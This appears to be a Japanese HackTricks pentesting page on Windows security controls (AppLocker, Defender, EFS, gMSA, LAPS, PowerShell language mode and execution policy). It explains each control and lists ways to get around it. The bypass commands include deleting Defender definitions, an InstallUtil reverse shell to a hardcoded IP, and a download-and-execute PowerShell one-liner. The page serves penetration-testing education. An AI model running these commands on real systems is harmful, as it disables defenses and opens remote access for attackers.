# Windowsセキュリティコントロール

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
- **ハッキングトリックを共有するために、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLockerポリシー

アプリケーションホワイトリストは、システム上に存在し実行されることが許可されている承認済みソフトウェアアプリケーションまたは実行可能ファイルのリストです。目的は、特定のビジネスニーズに合致しない有害なマルウェアや非承認のソフトウェアから環境を保護することです。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)は、Microsoftの**アプリケーションホワイトリストソリューション**であり、システム管理者に**ユーザーが実行できるアプリケーションとファイルを制御**する権限を与えます。実行可能ファイル、スクリプト、Windowsインストーラファイル、DLL、パッケージ化されたアプリ、パッケージ化されたアプリのインストーラに対して**細かい制御**を提供します。\
組織が**cmd.exeとPowerShell.exeをブロック**し、特定のディレクトリへの書き込みアクセスを制限することは一般的ですが、**これらはすべてバイパスできます**。

### チェック

ブラックリスト/ホワイトリストに登録されているファイル/拡張子をチェックします：
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
このレジストリパスには、AppLockerによって適用される構成とポリシーが含まれており、システムに強制されている現在のルールセットを確認する方法を提供しています：

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`


### バイパス

* AppLockerポリシーをバイパスするための便利な**書き込み可能フォルダ**：AppLockerが`C:\Windows\System32`または`C:\Windows`内で何でも実行を許可している場合、**バイパスする**ために使用できる**書き込み可能フォルダ**があります。
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* 一般的に**信頼される**[**"LOLBAS's"**](https://lolbas-project.github.io/) バイナリはAppLockerをバイパスするのに役立つことがあります。
* **不適切に書かれた規則はバイパスされる可能性があります**
* たとえば、**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**のような場合、**`allowed`**という名前のフォルダをどこにでも作成することができ、許可されます。
* 組織はしばしば**`%System32%\WindowsPowerShell\v1.0\powershell.exe`実行可能ファイルをブロック**することに焦点を当てますが、**他の**[**PowerShell実行可能ファイルの場所**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations)、たとえば`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`や`PowerShell_ISE.exe`などを忘れがちです。
* **DLLの強制は非常にまれに有効化**されます。システムにかかる追加負荷と、何も壊れないことを確認するために必要なテストの量が理由です。そのため、**DLLをバックドアとして使用するとAppLockerをバイパス**できます。
* [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)や[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)を使用して、任意のプロセスでPowershellコードを実行し、AppLockerをバイパスすることができます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)を参照してください。

## 資格情報の保存

### セキュリティアカウントマネージャー（SAM）

ローカルの資格情報はこのファイルに存在し、パスワードはハッシュ化されています。

### ローカルセキュリティ機関（LSA）- LSASS

**資格情報**（ハッシュ化された）は、このサブシステムの**メモリ**に保存されます。\
**LSA**は、ローカルの**セキュリティポリシー**（パスワードポリシー、ユーザー権限など）、**認証**、**アクセス証明書**などを管理します。\
LSAは、ローカルログインのために**提供された資格情報をSAMファイル内で確認**し、ドメインユーザーを認証するために**ドメインコントローラーと通信**します。

**資格情報**は、**LSASSプロセス内**に保存されます：Kerberosチケット、ハッシュNTおよびLM、簡単に復号化できるパスワード。

### LSAシークレット

LSAはディスクにいくつかの資格情報を保存することがあります：

* Active Directoryのコンピューターアカウントのパスワード（到達不能なドメインコントローラー）。
* Windowsサービスアカウントのパスワード
* スケジュールされたタスクのパスワード
* その他（IISアプリケーションのパスワードなど...）

### NTDS.dit

これはActive Directoryのデータベースです。ドメインコントローラーにのみ存在します。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender)は、Windows 10やWindows 11、およびWindows Serverのバージョンで利用可能なアンチウイルスソフトウェアです。**`WinPEAS`**などの一般的なペンテストツールを**ブロック**します。ただし、これらの保護を**バイパスする方法**もあります。

### チェック

**Defender**の**ステータス**を確認するには、PSコマンドレット**`Get-MpComputerStatus`**を実行します（**`RealTimeProtectionEnabled`**の値を確認してアクティブかどうかを確認します）：

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

列挙するには、次のコマンドを実行することもできます：
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## 暗号化ファイルシステム（EFS）

EFSは、**対称キー**である**ファイル暗号化キー（FEK）**を使用してファイルを暗号化し、ユーザーの**公開鍵**で暗号化されたこのキーは、暗号化されたファイルの$EFS **代替データストリーム**に保存されます。復号化が必要な場合、ユーザーのデジタル証明書の対応する**秘密鍵**が使用され、$EFSストリームからFEKを復号化します。詳細は[こちら](https://en.wikipedia.org/wiki/Encrypting_File_System)で確認できます。

**ユーザーの開始なしでの復号化シナリオ**には次のものがあります：

- ファイルやフォルダが[FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)などの非EFSファイルシステムに移動されると、自動的に復号化されます。
- SMB/CIFSプロトコルを介してネットワーク経由で送信される暗号化されたファイルは、送信前に復号化されます。

この暗号化方法により、所有者は暗号化されたファイルに**透過的にアクセス**できます。ただし、所有者のパスワードを単に変更してログインしても、復号化は許可されません。

**要点**：
- EFSは、ユーザーの公開鍵で暗号化された対称FEKを使用します。
- 復号化には、ユーザーの秘密鍵がFEKにアクセスするために使用されます。
- 特定の条件下で自動復号化が行われます。例：FAT32にコピーするか、ネットワーク経由で送信する場合。
- 追加の手順なしに、暗号化されたファイルに所有者がアクセスできます。

### EFS情報の確認

このパスが存在するかどうかを確認して、**ユーザー**がこの**サービス**を**使用**したかどうかを確認します：`C:\users\<username>\appdata\roaming\Microsoft\Protect`

`cipher /c \<file>`を使用して、ファイルに**アクセス**できる**ユーザー**を確認できます。また、フォルダ内で`cipher /e`および`cipher /d`を使用して、すべてのファイルを**暗号化**および**復号化**できます。

### EFSファイルの復号化

#### 権限システムであること

この方法では、**被害者ユーザー**がホスト内で**プロセス**を**実行**している必要があります。その場合、`meterpreter`セッションを使用して、ユーザーのプロセスのトークンを偽装できます（`incognito`の`impersonate_token`を使用）。または、ユーザーのプロセスに`migrate`することもできます。

#### ユーザーのパスワードを知っている場合

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## グループ管理サービスアカウント（gMSA）

Microsoftは、ITインフラストラクチャ内のサービスアカウントの管理を簡素化するために**グループ管理サービスアカウント（gMSA）**を開発しました。通常のサービスアカウントがしばしば**「パスワードの有効期限が切れない」**設定が有効になっているのに対し、gMSAはより安全で管理しやすいソリューションを提供します：

- **自動パスワード管理**：gMSAは、240文字の複雑なパスワードを使用し、ドメインまたはコンピューターポリシーに従って自動的に変更されます。このプロセスはMicrosoftのKey Distribution Service（KDC）によって処理され、手動でのパスワード更新の必要性を排除します。
- **強化されたセキュリティ**：これらのアカウントはロックアウトに対して免疫を持ち、対話型ログインに使用することはできないため、セキュリティが向上します。
- **複数ホストのサポート**：gMSAは複数のホストで共有できるため、複数のサーバーで実行されるサービスに最適です。
- **スケジュールされたタスクの機能**：管理されたサービスアカウントとは異なり、gMSAはスケジュールされたタスクの実行をサポートします。
- **簡素化されたSPN管理**：コンピューターのsAMaccountの詳細やDNS名に変更がある場合、システムは自動的にService Principal Name（SPN）を更新するため、SPNの管理が簡素化されます。

gMSAのパスワードはLDAPプロパティ_**msDS-ManagedPassword**_に保存され、ドメインコントローラー（DC）によって30日ごとに自動的にリセットされます。このパスワードは、[MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)として知られる暗号化されたデータブロブであり、認証された管理者およびgMSAがインストールされているサーバーのみが取得でき、安全な環境を確保します。この情報にアクセスするには、LDAPSなどのセキュアな接続が必要です。または、接続は'Sealing & Secure'で認証する必要があります。

![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

[**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)を使用してこのパスワードを読み取ることができます。
```
/GMSAPasswordReader --AccountName jkohler
```
**[この投稿で詳細を見つける](https://cube0x0.github.io/Relaying-for-gMSA/)**

また、**[このウェブページ](https://cube0x0.github.io/Relaying-for-gMSA/)**をチェックして、**NTLMリレーアタック**を実行して**gMSA**の**パスワード**を**読み取る**方法について学んでください。

## LAPS

**Local Administrator Password Solution (LAPS)** は、[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)からダウンロードでき、ローカル管理者パスワードの管理を可能にします。これらのパスワードは**ランダム化**され、ユニークで**定期的に変更**され、Active Directoryに中央集約されて保存されます。これらのパスワードへのアクセスは、承認されたユーザーに対してACLを介して制限されます。適切な権限が付与されると、ローカル管理者パスワードを読み取る機能が提供されます。

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShellの[**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)は、COMオブジェクトのブロック、承認された.NETタイプのみの許可、XAMLベースのワークフロー、PowerShellクラスなど、PowerShellを効果的に使用するために必要な多くの機能を**制限**します。

### **チェック**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### バイパス
```powershell
#Easy bypass
Powershell -version 2
```
In current Windows that Bypass won't work but you can use [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).  
**コンパイルするには**、**参照を追加する必要があるかもしれません** -> _**参照の追加**_ -> _参照の追加_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` を追加し、**プロジェクトを .Net4.5 に変更してください**。

#### 直接バイパス:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### リバースシェル:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)または[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)を使用して、**任意のプロセスでPowershellコードを実行**し、制約モードをバイパスできます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)をチェックしてください。

## PS実行ポリシー

デフォルトでは**restricted**に設定されています。このポリシーをバイパスする主な方法：
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
## セキュリティ サポート プロバイダー インターフェース（SSPI）

ユーザーの認証に使用できる API です。

SSPI は、通信を行いたい2台のマシンに適切なプロトコルを見つける役割を担います。これには、Kerberos が推奨されます。その後、SSPI は使用する認証プロトコルを交渉し、これらの認証プロトコルはセキュリティ サポート プロバイダー（SSP）と呼ばれ、各Windowsマシン内にDLLの形式で配置されており、両方のマシンが同じものをサポートしている必要があります。

### 主要なSSP

- **Kerberos**: 推奨されるもの
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** および **NTLMv2**: 互換性のため
- %windir%\Windows\System32\msv1\_0.dll
- **Digest**: Web サーバーおよび LDAP、MD5 ハッシュ形式のパスワード
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL および TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: 使用するプロトコルを交渉するために使用されます（Kerberos または NTLM、デフォルトは Kerberos）
- %windir%\Windows\System32\lsasrv.dll

#### 交渉は複数の方法を提供するか、1つだけを提供するかもしれません。

## UAC - ユーザーアカウント制御

[ユーザーアカウント制御（UAC）](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格されたアクティビティのための同意プロンプト** を有効にする機能です。

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) を使用して、世界で最も高度なコミュニティ ツールによって強化された **ワークフローを簡単に構築** および **自動化** します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>で学びましょう！</strong></summary>

HackTricks をサポートする他の方法：

- **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロード** したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) を確認してください！
- [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手してください
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つけます
- 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) をフォローしてください。
- **ハッキングトリックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリに PR を提出してください。

</details>
